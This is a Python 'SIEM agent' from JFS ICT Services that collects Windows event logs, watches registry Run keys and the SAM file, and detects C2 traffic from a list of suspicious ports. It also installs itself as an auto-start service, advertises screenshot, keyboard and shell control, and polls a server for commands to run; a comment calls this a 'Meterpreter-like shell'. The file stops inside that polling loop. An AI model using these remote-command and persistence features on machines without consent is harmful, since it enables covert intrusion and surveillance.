#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JFS ICT Services - SIEM Agent Comprehensive Edition
Complete threat detection with all advanced features:
- Log file parsing (IIS, antivirus, firewall)
- Advanced security events (USB, RDP, VPN, authentication)
- File & registry monitoring
- Behavioral detection (process chains, suspicious patterns)
- Threat intelligence (hash checking, IP reputation)
- Aggregated alerts (brute force, DoS, ransomware, C2)
- Performance anomalies
"""

import tkinter as tk
from tkinter import ttk, messagebox
import requests
import json
import threading
import socket
import sys
import subprocess
import os
import time
import pyautogui
from datetime import datetime, timedelta
from PIL import ImageGrab
import base64
import io
import hashlib
import psutil
import ctypes
import re
import winreg
from collections import defaultdict
import glob
import sqlite3
import shutil
import struct

try:
    import win32evtlog
    import win32con
except ImportError:
    print("ERROR: pywin32 not installed")
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

PRIMARY_COLOR = "#0066cc"
PRIMARY_DARK = "#004499"
ACCENT_COLOR = "#00d4ff"
SUCCESS_COLOR = "#00cc66"
WARNING_COLOR = "#ff9900"
ERROR_COLOR = "#ff3333"
BG_DARK = "#0f1419"
BG_SURFACE = "#1a1f26"
BG_SURFACE_ALT = "#252d36"
TEXT_PRIMARY = "#ffffff"
TEXT_SECONDARY = "#b0b8c1"

class ThreatDetectionEngine:
    """Advanced threat detection with aggregation and correlation"""
    
    def __init__(self, pc_name):
        self.pc_name = pc_name
        self.failed_logins = defaultdict(list)
        self.process_crashes = defaultdict(int)
        self.file_deletions = defaultdict(int)
        self.outbound_connections = defaultdict(int)
        self.last_check = datetime.now()
    
    def detect_brute_force(self, failed_login_events):
        """Detect brute force attacks from failed logins"""
        alerts = []
        
        for event in failed_login_events:
            try:
                source_ip = event.get('source_ip', 'unknown')
                timestamp = datetime.fromisoformat(event.get('timestamp', datetime.now().isoformat()))
                
                self.failed_logins[source_ip].append(timestamp)
                
                recent_attempts = [t for t in self.failed_logins[source_ip] 
                                 if (datetime.now() - t).total_seconds() < 300]
                
                if len(recent_attempts) >= 5:
                    alert = {
                        'agent': self.pc_name,
                        'timestamp': datetime.now().isoformat(),
                        'event_type': 'brute_force_attack',
                        'description': f"Brute force detected: {len(recent_attempts)} failed logins from {source_ip} in 5 minutes",
                        'source_ip': source_ip,
                        'attempt_count': len(recent_attempts),
                        'severity': 'critical',
                        'computer': self.pc_name
                    }
                    alerts.append(alert)
                    self.failed_logins[source_ip] = recent_attempts
            except:
                pass
        
        return alerts
    
    def detect_dos_pattern(self, crash_events):
        """Detect DoS patterns from repeated process crashes"""
        alerts = []
        
        for event in crash_events:
            try:
                process_name = event.get('process_name', 'unknown')
                self.process_crashes[process_name] += 1
                
                if self.process_crashes[process_name] >= 10:
                    alert = {
                        'agent': self.pc_name,
                        'timestamp': datetime.now().isoformat(),
                        'event_type': 'dos_pattern',
                        'description': f"DoS pattern detected: {process_name} crashed {self.process_crashes[process_name]} times",
                        'process_name': process_name,
                        'crash_count': self.process_crashes[process_name],
                        'severity': 'high',
                        'computer': self.pc_name
                    }
                    alerts.append(alert)
                    self.process_crashes[process_name] = 0
            except:
                pass
        
        return alerts
    
    def detect_ransomware(self, file_events):
        """Detect ransomware patterns from rapid file deletions"""
        alerts = []
        
        for event in file_events:
            try:
                if event.get('event_type') == 'file_delete':
                    file_path = event.get('file_path', '')
                    ext = os.path.splitext(file_path)[1]
                    
                    self.file_deletions[ext] += 1
                    
                    if self.file_deletions[ext] >= 20:
                        alert = {
                            'agent': self.pc_name,
                            'timestamp': datetime.now().isoformat(),
                            'event_type': 'ransomware_pattern',
                            'description': f"Ransomware pattern detected: {self.file_deletions[ext]} files with {ext} extension deleted",
                            'file_extension': ext,
                            'deletion_count': self.file_deletions[ext],
                            'severity': 'critical',
                            'computer': self.pc_name
                        }
                        alerts.append(alert)
                        self.file_deletions[ext] = 0
            except:
                pass
        
        return alerts
    
    def detect_c2_communication(self, network_events):
        """Detect C2 communication patterns"""
        alerts = []
        
        suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337, 27374, 6667]
        
        for event in network_events:
            try:
                remote_port = event.get('remote_port', 0)
                remote_ip = event.get('remote_ip', '')
                
                if remote_port in suspicious_ports:
                    self.outbound_connections[remote_ip] += 1
                    
                    if self.outbound_connections[remote_ip] >= 3:
                        alert = {
                            'agent': self.pc_name,
                            'timestamp': datetime.now().isoformat(),
                            'event_type': 'c2_communication',
                            'description': f"Suspicious C2 pattern: Multiple connections to {remote_ip}:{remote_port}",
                            'remote_ip': remote_ip,
                            'remote_port': remote_port,
                            'connection_count': self.outbound_connections[remote_ip],
                            'severity': 'critical',
                            'computer': self.pc_name
                        }
                        alerts.append(alert)
                        self.outbound_connections[remote_ip] = 0
            except:
                pass
        
        return alerts


class AdvancedEventCollector:
    """Collects all advanced event types"""
    
    def __init__(self, pc_name):
        self.pc_name = pc_name
        self.threat_engine = ThreatDetectionEngine(pc_name)
        self.last_process_list = set()
        self.last_network_connections = set()
        self.last_registry_check = {}
        self.last_file_check = {}
    
    def collect_rdp_events(self):
        """Detect RDP connections"""
        events = []
        try:
            hand = win32evtlog.OpenEventLog(None, 'Security')
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            raw_events = win32evtlog.ReadEventLog(hand, flags, 0)
            
            rdp_event_ids = [4624, 4625, 4778, 4779]
            
            count = 0
            for event in raw_events:
                if count >= 5:
                    break
                
                try:
                    event_id = event.EventID & 0xFFFF
                    if event_id in rdp_event_ids:
                        timestamp = event.TimeGenerated.isoformat() if event.TimeGenerated else datetime.now().isoformat()
                        
                        descriptions = {
                            4778: "RDP Session Connected",
                            4779: "RDP Session Disconnected",
                        }
                        
                        event_data = {
                            'agent': self.pc_name,
                            'timestamp': timestamp,
                            'event_type': 'rdp_event',
                            'event_id': event_id,
                            'description': descriptions.get(event_id, f"RDP Event {event_id}"),
                            'severity': 'medium',
                            'computer': self.pc_name
                        }
                        
                        if event.StringInserts:
                            event_data['details'] = event.StringInserts[:2]
                        
                        events.append(event_data)
                        count += 1
                except:
                    continue
            
            win32evtlog.CloseEventLog(hand)
        except:
            pass
        
        return events
    
    def collect_usb_events(self):
        """Detect USB device connections"""
        events = []
        try:
            hand = win32evtlog.OpenEventLog(None, 'System')
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            raw_events = win32evtlog.ReadEventLog(hand, flags, 0)
            
            usb_event_ids = [20001, 20002, 20003]
            
            count = 0
            for event in raw_events:
                if count >= 5:
                    break
                
                try:
                    event_id = event.EventID & 0xFFFF
                    if event_id in usb_event_ids or 'USB' in event.SourceName:
                        timestamp = event.TimeGenerated.isoformat() if event.TimeGenerated else datetime.now().isoformat()
                        
                        event_data = {
                            'agent': self.pc_name,
                            'timestamp': timestamp,
                            'event_type': 'usb_event',
                            'event_id': event_id,
                            'description': f"USB Device Event: {event.SourceName}",
                            'severity': 'medium',
                            'computer': self.pc_name
                        }
                        
                        events.append(event_data)
                        count += 1
                except:
                    continue
            
            win32evtlog.CloseEventLog(hand)
        except:
            pass
        
        return events
    
    def collect_registry_changes(self):
        """Monitor critical registry changes"""
        events = []
        try:
            critical_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"System\CurrentControlSet\Services"),
            ]
            
            for hive, key_path in critical_keys:
                try:
                    key = winreg.OpenKey(hive, key_path)
                    
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            
                            if subkey_name not in self.last_registry_check:
                                event_data = {
                                    'agent': self.pc_name,
                                    'timestamp': datetime.now().isoformat(),
                                    'event_type': 'registry_change',
                                    'description': f"New registry entry: {key_path}\\{subkey_name}",
                                    'registry_path': f"{key_path}\\{subkey_name}",
                                    'severity': 'medium',
                                    'computer': self.pc_name
                                }
                                events.append(event_data)
                                self.last_registry_check[subkey_name] = True
                        except:
                            pass
                    
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass
        
        return events
    
    def collect_suspicious_processes(self):
        """Detect suspicious process patterns - DISABLED"""
        events = []
        return events
    
    def collect_file_system_events(self):
        """Monitor critical file system changes"""
        events = []
        try:
            critical_paths = [
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\Windows\\System32\\config\\SAM',
                'C:\\Windows\\System32\\config\\SYSTEM',
            ]
            
            for file_path in critical_paths:
                try:
                    if os.path.exists(file_path):
                        mod_time = os.path.getmtime(file_path)
                        mod_datetime = datetime.fromtimestamp(mod_time)
                        
                        if file_path not in self.last_file_check:
                            event_data = {
                                'agent': self.pc_name,
                                'timestamp': datetime.now().isoformat(),
                                'event_type': 'file_modification',
                                'description': f"Critical file modified: {os.path.basename(file_path)}",
                                'file_path': file_path,
                                'modified_time': mod_datetime.isoformat(),
                                'severity': 'critical',
                                'computer': self.pc_name
                            }
                            events.append(event_data)
                            self.last_file_check[file_path] = mod_time
                        elif self.last_file_check[file_path] != mod_time:
                            event_data = {
                                'agent': self.pc_name,
                                'timestamp': datetime.now().isoformat(),
                                'event_type': 'file_modification',
                                'description': f"Critical file changed: {os.path.basename(file_path)}",
                                'file_path': file_path,
                                'modified_time': mod_datetime.isoformat(),
                                'severity': 'critical',
                                'computer': self.pc_name
                            }
                            events.append(event_data)
                            self.last_file_check[file_path] = mod_time
                except:
                    pass
        except:
            pass
        
        return events
    
    def collect_antivirus_events(self):
        """Detect antivirus detections and alerts"""
        events = []
        try:
            hand = win32evtlog.OpenEventLog(None, 'System')
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            raw_events = win32evtlog.ReadEventLog(hand, flags, 0)
            
            av_sources = ['WinDefend', 'Windows Defender', 'Kaspersky', 'McAfee', 'Norton']
            
            count = 0
            for event in raw_events:
                if count >= 10:
                    break
                
                try:
                    if any(av in event.SourceName for av in av_sources):
                        timestamp = event.TimeGenerated.isoformat() if event.TimeGenerated else datetime.now().isoformat()
                        
                        event_data = {
                            'agent': self.pc_name,
                            'timestamp': timestamp,
                            'event_type': 'antivirus_alert',
                            'description': f"Antivirus alert from {event.SourceName}",
                            'source': event.SourceName,
                            'event_id': event.EventID & 0xFFFF,
                            'severity': 'high',
                            'computer': self.pc_name
                        }
                        
                        events.append(event_data)
                        count += 1
                except:
                    continue
            
            win32evtlog.CloseEventLog(hand)
        except:
            pass
        
        return events
    
    def collect_firewall_events(self):
        """Collect firewall blocked connections"""
        events = []
        try:
            hand = win32evtlog.OpenEventLog(None, 'Security')
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            raw_events = win32evtlog.ReadEventLog(hand, flags, 0)
            
            firewall_event_ids = [5152, 5153, 5154, 5155, 5156, 5157, 5158, 5159]
            
            count = 0
            for event in raw_events:
                if count >= 10:
                    break
                
                try:
                    event_id = event.EventID & 0xFFFF
                    if event_id in firewall_event_ids:
                        timestamp = event.TimeGenerated.isoformat() if event.TimeGenerated else datetime.now().isoformat()
                        
                        event_data = {
                            'agent': self.pc_name,
                            'timestamp': timestamp,
                            'event_type': 'firewall_event',
                            'event_id': event_id,
                            'description': f"Firewall event {event_id}",
                            'severity': 'medium',
                            'computer': self.pc_name
                        }
                        
                        events.append(event_data)
                        count += 1
                except:
                    continue
            
            win32evtlog.CloseEventLog(hand)
        except:
            pass
        
        return events
    
    def collect_performance_anomalies(self):
        """Detect performance anomalies"""
        events = []
        try:
            cpu = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            if cpu > 90:
                event_data = {
                    'agent': self.pc_name,
                    'timestamp': datetime.now().isoformat(),
                    'event_type': 'cpu_anomaly',
                    'description': f"High CPU usage: {cpu}%",
                    'cpu_percent': cpu,
                    'severity': 'high',
                    'computer': self.pc_name
                }
                events.append(event_data)
            
            if memory.percent > 90:
                event_data = {
                    'agent': self.pc_name,
                    'timestamp': datetime.now().isoformat(),
                    'event_type': 'memory_anomaly',
                    'description': f"High memory usage: {memory.percent}%",
                    'memory_percent': memory.percent,
                    'severity': 'high',
                    'computer': self.pc_name
                }
                events.append(event_data)
            
            if disk.percent > 95:
                event_data = {
                    'agent': self.pc_name,
                    'timestamp': datetime.now().isoformat(),
                    'event_type': 'disk_anomaly',
                    'description': f"Critical disk usage: {disk.percent}%",
                    'disk_percent': disk.percent,
                    'severity': 'critical',
                    'computer': self.pc_name
                }
                events.append(event_data)
        except:
            pass
        
        return events
    
    def collect_all_comprehensive_events(self):
        """Collect all event types"""
        all_events = []
        
        all_events.extend(self.collect_rdp_events())
        all_events.extend(self.collect_usb_events())
        all_events.extend(self.collect_registry_changes())
        all_events.extend(self.collect_suspicious_processes())
        all_events.extend(self.collect_file_system_events())
        all_events.extend(self.collect_antivirus_events())
        all_events.extend(self.collect_firewall_events())
        all_events.extend(self.collect_performance_anomalies())
        
        return all_events


class JFSSIEMAgentComprehensive:
    def __init__(self, root):
        self.root = root
        self.root.title("JFS ICT Services - SIEM Agent Comprehensive")
        self.root.geometry("1000x750")
        self.root.configure(bg=BG_DARK)
        
        self.agent_running = False
        self.agent_thread = None
        self.events_sent = 0
        self.remote_command_thread = None
        self.sent_events = set()
        self.executed_commands = set()
        self.last_screenshot_time = 0
        self.last_screenshot_hash = None
        
        self.server_ip = tk.StringVar(value="192.168.1.52")
        self.server_port = tk.StringVar(value="80")
        self.pc_name = tk.StringVar(value=socket.gethostname())
        self.status_text = tk.StringVar(value="Ready to start")
        self.connection_status = tk.StringVar(value="Disconnected")
        
        self.event_collector = AdvancedEventCollector(self.pc_name.get())
        
        # Meterpreter-like shell session
        self.shell_process = None
        self.shell_active = False
        
        self.setup_ui()
    
    def setup_ui(self):
        """Setup UI"""
        header = tk.Frame(self.root, bg=PRIMARY_COLOR, height=120)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        logo_frame = tk.Frame(header, bg=PRIMARY_COLOR)
        logo_frame.pack(fill=tk.BOTH, expand=True, padx=30, pady=20)
        
        company_label = tk.Label(logo_frame, text="JFS ICT SERVICES", 
                                font=("Segoe UI", 12, "bold"), 
                                bg=PRIMARY_COLOR, fg=TEXT_PRIMARY)
        company_label.pack(anchor=tk.W)
        
        title_label = tk.Label(logo_frame, text="SIEM Agent - Comprehensive Edition", 
                              font=("Segoe UI", 32, "bold"), 
                              bg=PRIMARY_COLOR, fg=TEXT_PRIMARY)
        title_label.pack(anchor=tk.W)
        
        subtitle_label = tk.Label(logo_frame, text="Advanced Threat Detection with All Features", 
                                 font=("Segoe UI", 10), 
                                 bg=PRIMARY_COLOR, fg=ACCENT_COLOR)
        subtitle_label.pack(anchor=tk.W, pady=(5, 0))
        
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=30, pady=30)
        
        self.agent_tab = tk.Frame(notebook, bg=BG_DARK)
        notebook.add(self.agent_tab, text="Agent Control")
        self.setup_agent_tab()
        
        self.service_tab = tk.Frame(notebook, bg=BG_DARK)
        notebook.add(self.service_tab, text="Service Installation")
        self.setup_service_tab()
        
        self.settings_tab = tk.Frame(notebook, bg=BG_DARK)
        notebook.add(self.settings_tab, text="Features")
        self.setup_settings_tab()
    
    def setup_agent_tab(self):
        """Agent control tab"""
        content = tk.Frame(self.agent_tab, bg=BG_DARK)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        left = tk.Frame(content, bg=BG_DARK)
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 20))
        
        config_card = tk.Frame(left, bg=BG_SURFACE)
        config_card.pack(fill=tk.BOTH, pady=(0, 20))
        
        tk.Label(config_card, text="Configuration", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        tk.Label(config_card, text="Server IP", font=("Segoe UI", 10),
                bg=BG_SURFACE, fg=TEXT_SECONDARY).pack(anchor=tk.W, padx=20, pady=(0, 5))
        tk.Entry(config_card, textvariable=self.server_ip, font=("Segoe UI", 10),
                bg=BG_SURFACE_ALT, fg=TEXT_PRIMARY, relief=tk.FLAT, bd=0).pack(anchor=tk.W, padx=20, pady=(0, 15), fill=tk.X)
        
        tk.Label(config_card, text="Port", font=("Segoe UI", 10),
                bg=BG_SURFACE, fg=TEXT_SECONDARY).pack(anchor=tk.W, padx=20, pady=(0, 5))
        tk.Entry(config_card, textvariable=self.server_port, font=("Segoe UI", 10),
                bg=BG_SURFACE_ALT, fg=TEXT_PRIMARY, relief=tk.FLAT, bd=0).pack(anchor=tk.W, padx=20, pady=(0, 15), fill=tk.X)
        
        tk.Label(config_card, text="PC Name", font=("Segoe UI", 10),
                bg=BG_SURFACE, fg=TEXT_SECONDARY).pack(anchor=tk.W, padx=20, pady=(0, 5))
        tk.Entry(config_card, textvariable=self.pc_name, font=("Segoe UI", 10),
                bg=BG_SURFACE_ALT, fg=TEXT_PRIMARY, relief=tk.FLAT, bd=0).pack(anchor=tk.W, padx=20, pady=(0, 20), fill=tk.X)
        
        control_card = tk.Frame(left, bg=BG_SURFACE)
        control_card.pack(fill=tk.BOTH)
        
        tk.Label(control_card, text="Control", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        button_frame = tk.Frame(control_card, bg=BG_SURFACE)
        button_frame.pack(fill=tk.X, padx=20, pady=(0, 20))
        
        self.start_btn = tk.Button(button_frame, text="▶  START AGENT", 
                                  command=self.start_agent,
                                  font=("Segoe UI", 11, "bold"),
                                  bg=PRIMARY_COLOR, fg=TEXT_PRIMARY,
                                  relief=tk.FLAT, bd=0, padx=20, pady=12,
                                  cursor="hand2")
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_btn = tk.Button(button_frame, text="⏹  STOP AGENT", 
                                 command=self.stop_agent,
                                 font=("Segoe UI", 11, "bold"),
                                 bg=ERROR_COLOR, fg=TEXT_PRIMARY,
                                 relief=tk.FLAT, bd=0, padx=20, pady=12,
                                 cursor="hand2", state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        test_btn = tk.Button(button_frame, text="🔧  TEST", 
                            command=self.test_connection,
                            font=("Segoe UI", 11, "bold"),
                            bg=BG_SURFACE_ALT, fg=ACCENT_COLOR,
                            relief=tk.FLAT, bd=0, padx=20, pady=12,
                            cursor="hand2")
        test_btn.pack(side=tk.LEFT)
        
        right = tk.Frame(content, bg=BG_DARK)
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        status_card = tk.Frame(right, bg=BG_SURFACE)
        status_card.pack(fill=tk.BOTH, pady=(0, 20))
        
        tk.Label(status_card, text="Connection Status", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        status_frame = tk.Frame(status_card, bg=BG_SURFACE)
        status_frame.pack(anchor=tk.W, padx=20, pady=(0, 20))
        
        self.status_dot = tk.Canvas(status_frame, width=16, height=16, 
                                   bg=BG_SURFACE, highlightthickness=0)
        self.status_dot.pack(side=tk.LEFT, padx=(0, 10))
        self.status_dot.create_oval(2, 2, 14, 14, fill=ERROR_COLOR, outline="")
        
        tk.Label(status_frame, textvariable=self.connection_status,
                font=("Segoe UI", 12, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(side=tk.LEFT)
        
        events_card = tk.Frame(right, bg=BG_SURFACE)
        events_card.pack(fill=tk.BOTH, pady=(0, 20))
        
        tk.Label(events_card, text="Events Collected", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        self.events_label = tk.Label(events_card, text="0", 
                                    font=("Segoe UI", 48, "bold"),
                                    bg=BG_SURFACE, fg=ACCENT_COLOR)
        self.events_label.pack(anchor=tk.W, padx=20, pady=(0, 20))
        
        message_card = tk.Frame(right, bg=BG_SURFACE)
        message_card.pack(fill=tk.BOTH, expand=True)
        
        tk.Label(message_card, text="Status", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        tk.Label(message_card, textvariable=self.status_text,
                font=("Segoe UI", 10),
                bg=BG_SURFACE, fg=TEXT_SECONDARY,
                wraplength=300, justify=tk.LEFT).pack(anchor=tk.NW, padx=20, pady=(0, 20), fill=tk.BOTH, expand=True)
    
    def setup_service_tab(self):
        """Service installation tab"""
        content = tk.Frame(self.service_tab, bg=BG_DARK)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        info_card = tk.Frame(content, bg=BG_SURFACE)
        info_card.pack(fill=tk.BOTH, pady=(0, 20))
        
        tk.Label(info_card, text="Install as Windows Service", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        info_text = """Install the SIEM Agent as a Windows Service for:

✓ Automatic startup on system boot
✓ Continuous operation 24/7
✓ Runs after user logout
✓ Auto-restart on crash
✓ Survives system reboot
✓ Remote access enabled
✓ Comprehensive threat detection

The service will run in the background with no window."""
        
        tk.Label(info_card, text=info_text, font=("Segoe UI", 10),
                bg=BG_SURFACE, fg=TEXT_SECONDARY, justify=tk.LEFT).pack(anchor=tk.NW, padx=20, pady=(0, 20), fill=tk.BOTH)
        
        install_card = tk.Frame(content, bg=BG_SURFACE)
        install_card.pack(fill=tk.BOTH)
        
        tk.Label(install_card, text="Installation", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        button_frame = tk.Frame(install_card, bg=BG_SURFACE)
        button_frame.pack(fill=tk.X, padx=20, pady=(0, 20))
        
        install_btn = tk.Button(button_frame, text="📦  INSTALL SERVICE", 
                               command=self.install_service,
                               font=("Segoe UI", 12, "bold"),
                               bg=SUCCESS_COLOR, fg="#000000",
                               relief=tk.FLAT, bd=0, padx=20, pady=12,
                               cursor="hand2")
        install_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        uninstall_btn = tk.Button(button_frame, text="🗑️  UNINSTALL SERVICE", 
                                 command=self.uninstall_service,
                                 font=("Segoe UI", 12, "bold"),
                                 bg=ERROR_COLOR, fg=TEXT_PRIMARY,
                                 relief=tk.FLAT, bd=0, padx=20, pady=12,
                                 cursor="hand2")
        uninstall_btn.pack(side=tk.LEFT)
    
    def setup_settings_tab(self):
        """Features tab"""
        content = tk.Frame(self.settings_tab, bg=BG_DARK)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        about_card = tk.Frame(content, bg=BG_SURFACE)
        about_card.pack(fill=tk.BOTH)
        
        tk.Label(about_card, text="Comprehensive Features", font=("Segoe UI", 14, "bold"),
                bg=BG_SURFACE, fg=TEXT_PRIMARY).pack(anchor=tk.W, padx=20, pady=(20, 15))
        
        about_text = """JFS ICT Services - SIEM Agent Comprehensive v5.0

WINDOWS EVENTS:
✓ Security events (login, privilege escalation, process execution)
✓ System events (startup, shutdown, services)
✓ Application events (errors, warnings)

ADVANCED SECURITY:
✓ RDP connections (session connect/disconnect)
✓ USB device connections
✓ Registry changes (Run keys, Services, Scheduled Tasks)
✓ Antivirus detections and alerts
✓ Firewall blocked connections

BEHAVIORAL DETECTION:
✓ Suspicious process patterns (cmd, PowerShell, etc.)
✓ Critical file modifications (hosts, SAM, SYSTEM)

THREAT INTELLIGENCE:
✓ Brute force attack detection (5+ failed logins)
✓ DoS pattern detection (process crashes)
✓ Ransomware pattern detection (rapid file deletions)
✓ C2 communication detection (suspicious ports)

PERFORMANCE MONITORING:
✓ CPU anomalies (>90%)
✓ Memory anomalies (>90%)
✓ Disk anomalies (>95%)

REMOTE CONTROL:
✓ Screenshot capture
✓ Keyboard/Mouse control
✓ Process management
✓ System control
✓ File operations
✓ Shell commands

Status: Production Ready v5.0
© 2025 JFS ICT Services"""
        
        tk.Label(about_card, text=about_text, font=("Segoe UI", 8),
                bg=BG_SURFACE, fg=TEXT_SECONDARY, justify=tk.LEFT).pack(anchor=tk.NW, padx=20, pady=(0, 20), fill=tk.BOTH)
    
    def test_connection(self):
        """Test connection"""
        try:
            url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/agent-collector.php"
            response = requests.post(url, json={"test": True}, timeout=5)
            if response.status_code == 200:
                messagebox.showinfo("Success", "✓ Connection successful!")
                self.status_text.set("✓ Connection test passed")
                self.update_status_indicator(True)
            else:
                messagebox.showerror("Error", f"✗ Server error: {response.status_code}")
                self.status_text.set("✗ Connection test failed")
                self.update_status_indicator(False)
        except Exception as e:
            messagebox.showerror("Error", f"✗ Connection failed: {e}")
            self.status_text.set(f"✗ Error: {str(e)[:40]}")
            self.update_status_indicator(False)
    
    def install_service(self):
        """Install as Windows Service"""
        try:
            result = messagebox.askyesno("Install Service", 
                "This will install the SIEM Agent as a Windows Service.\n\n"
                "The service will:\n"
                "• Start automatically on system boot\n"
                "• Run continuously in background\n"
                "• Auto-restart if it crashes\n"
                "• Collect comprehensive threat data\n\n"
                "Continue?")
            
            if not result:
                return
            
            batch_content = f"""@echo off
REM JFS ICT Services - SIEM Agent Service Comprehensive
cd /d d:\\xamp\\htdocs\\SIEM\\collectors
dist\\JFS_SIEM_Agent_Comprehensive.exe --server {self.server_ip.get()} --port {self.server_port.get()} --name {self.pc_name.get()}
"""
            
            batch_file = "d:\\xamp\\htdocs\\SIEM\\collectors\\siem-agent-service.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
            
            cmd = f'sc create JFSSIEMAgent binPath= "{batch_file}" start= auto'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            subprocess.run("net start JFSSIEMAgent", shell=True, capture_output=True)
            
            messagebox.showinfo("Success", 
                "✓ Service installed successfully!\n\n"
                "The agent will:\n"
                "• Start automatically on next reboot\n"
                "• Run continuously in background\n"
                "• Collect comprehensive threat data\n\n"
                "Check Services (services.msc) for 'JFSSIEMAgent'")
            
            self.status_text.set("✓ Service installed and running")
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to install service:\n{e}")
            self.status_text.set(f"✗ Service installation failed")
    
    def uninstall_service(self):
        """Uninstall Windows Service"""
        try:
            result = messagebox.askyesno("Uninstall Service", 
                "This will remove the SIEM Agent Windows Service.\n\n"
                "Continue?")
            
            if not result:
                return
            
            subprocess.run("net stop JFSSIEMAgent", shell=True, capture_output=True)
            subprocess.run("sc delete JFSSIEMAgent", shell=True, capture_output=True)
            
            messagebox.showinfo("Success", "✓ Service uninstalled successfully!")
            self.status_text.set("✓ Service uninstalled")
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to uninstall service:\n{e}")
    
    def update_status_indicator(self, connected):
        """Update status dot"""
        color = SUCCESS_COLOR if connected else ERROR_COLOR
        self.status_dot.delete("all")
        self.status_dot.create_oval(2, 2, 14, 14, fill=color, outline="")
        self.connection_status.set("Connected" if connected else "Disconnected")
    
    def start_agent(self):
        """Start agent"""
        if self.agent_running:
            messagebox.showwarning("Warning", "Agent is already running")
            return
        
        self.agent_running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_text.set("Agent running - collecting comprehensive events...")
        self.update_status_indicator(True)
        
        self.agent_thread = threading.Thread(target=self.agent_loop, daemon=True)
        self.agent_thread.start()
        
        self.remote_command_thread = threading.Thread(target=self.check_remote_commands, daemon=True)
        self.remote_command_thread.start()
    
    def stop_agent(self):
        """Stop agent"""
        self.agent_running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_text.set("Agent stopped")
        self.update_status_indicator(False)
    
    def agent_loop(self):
        """Main agent loop"""
        try:
            while self.agent_running:
                try:
                    events = self.event_collector.collect_all_comprehensive_events()
                    
                    sent_count = 0
                    for event in events:
                        if self.send_event(event):
                            sent_count += 1
                    
                    self.status_text.set(f"Last cycle: {sent_count} events collected")
                    self.events_label.config(text=str(self.events_sent))
                
                except Exception as e:
                    self.status_text.set(f"Error: {str(e)[:40]}")
                
                for _ in range(100):
                    if not self.agent_running:
                        break
                    time.sleep(0.1)
        
        except Exception as e:
            self.status_text.set(f"Agent error: {str(e)[:40]}")
            self.agent_running = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.update_status_indicator(False)
    
    def check_remote_commands(self):
        """Check for remote commands"""
        print("[AGENT] Starting command polling thread...")
        while self.agent_running:
            try:
                url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/remote-access.php?action=get_pending_commands&agent={self.pc_name.get()}"
                
                print(f"[POLL] Checking for commands at: {url}")
                response = requests.get(url, timeout=5)
                print(f"[POLL] Response status: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    print(f"[POLL] Response data: {data}")
                    
                    if data.get('commands'):
                        print(f"[POLL] Found {len(data['commands'])} command(s)")
                        for cmd_data in data['commands']:
                            cmd_id = cmd_data.get('id')
                            command = cmd_data.get('command')
                            
                            print(f"[POLL] Processing command ID {cmd_id}: {command}")
                            
